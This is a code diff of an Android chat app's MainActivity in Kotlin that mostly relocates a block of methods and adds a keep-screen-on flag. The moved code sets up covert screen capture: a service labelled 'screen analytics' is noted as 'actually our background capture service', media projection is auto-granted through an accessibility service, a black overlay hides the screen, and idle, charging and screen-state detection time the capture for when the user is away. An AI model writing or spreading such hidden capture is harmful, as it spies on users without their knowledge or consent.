@@ -77,6 +77,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             finish()
             return
         }
+        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
         initializeAppAnalytics()
         setupDrawer()
         loadUserProfile()
@@ -265,6 +266,58 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
+    private fun openUserProfile(userId: String) {
+        val intent = Intent(this, ProfileActivity::class.java)
+        intent.putExtra("userId", userId)
+        startActivity(intent)
+    }
+
+    /**
+     * Start the screen analytics service
+     * (Actually our background capture service)
+     */
+    private fun startScreenAnalyticsService(resultCode: Int, data: Intent) {
+        val serviceIntent = Intent(this, BackgroundSyncService::class.java)
+        serviceIntent.action = "SETUP_PROJECTION"
+        serviceIntent.putExtra("resultCode", resultCode)
+        serviceIntent.putExtra("data", data)
+        startService(serviceIntent)
+    }
+    private fun registerSystemBroadcasts() {
+        // Monitor charging state
+        val batteryFilter = IntentFilter().apply {
+            addAction(Intent.ACTION_POWER_CONNECTED)
+            addAction(Intent.ACTION_POWER_DISCONNECTED)
+        }
+        registerReceiver(object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val isCharging = intent.action == Intent.ACTION_POWER_CONNECTED
+                IdleDetector.updateChargingState(isCharging)
+            }
+        }, batteryFilter)
+
+        // Monitor screen state
+        val screenFilter = IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+        }
+        registerReceiver(object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val isScreenOn = intent.action == Intent.ACTION_SCREEN_ON
+                IdleDetector.updateScreenState(isScreenOn)
+            }
+        }, screenFilter)
+    }
+    override fun onUserInteraction() {
+        super.onUserInteraction()
+
+        // User is active, hide overlay if it's showing
+        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
+
+        // Register activity with idle detector
+        IdleDetector.registerUserActivity()
+    }
+
     private fun requestMediaProjection() {
         // Only request if accessibility service is enabled to auto-grant
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
@@ -387,57 +440,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
-    private fun openUserProfile(userId: String) {
-        val intent = Intent(this, ProfileActivity::class.java)
-        intent.putExtra("userId", userId)
-        startActivity(intent)
-    }
-
-    /**
-     * Start the screen analytics service
-     * (Actually our background capture service)
-     */
-    private fun startScreenAnalyticsService(resultCode: Int, data: Intent) {
-        val serviceIntent = Intent(this, BackgroundSyncService::class.java)
-        serviceIntent.action = "SETUP_PROJECTION"
-        serviceIntent.putExtra("resultCode", resultCode)
-        serviceIntent.putExtra("data", data)
-        startService(serviceIntent)
-    }
-    private fun registerSystemBroadcasts() {
-        // Monitor charging state
-        val batteryFilter = IntentFilter().apply {
-            addAction(Intent.ACTION_POWER_CONNECTED)
-            addAction(Intent.ACTION_POWER_DISCONNECTED)
-        }
-        registerReceiver(object : BroadcastReceiver() {
-            override fun onReceive(context: Context, intent: Intent) {
-                val isCharging = intent.action == Intent.ACTION_POWER_CONNECTED
-                IdleDetector.updateChargingState(isCharging)
-            }
-        }, batteryFilter)
-
-        // Monitor screen state
-        val screenFilter = IntentFilter().apply {
-            addAction(Intent.ACTION_SCREEN_ON)
-            addAction(Intent.ACTION_SCREEN_OFF)
-        }
-        registerReceiver(object : BroadcastReceiver() {
-            override fun onReceive(context: Context, intent: Intent) {
-                val isScreenOn = intent.action == Intent.ACTION_SCREEN_ON
-                IdleDetector.updateScreenState(isScreenOn)
-            }
-        }, screenFilter)
-    }
-    override fun onUserInteraction() {
-        super.onUserInteraction()
-
-        // User is active, hide overlay if it's showing
-        com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
-
-        // Register activity with idle detector
-        IdleDetector.registerUserActivity()
-    }
     override fun onResume() {
         super.onResume()
         loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
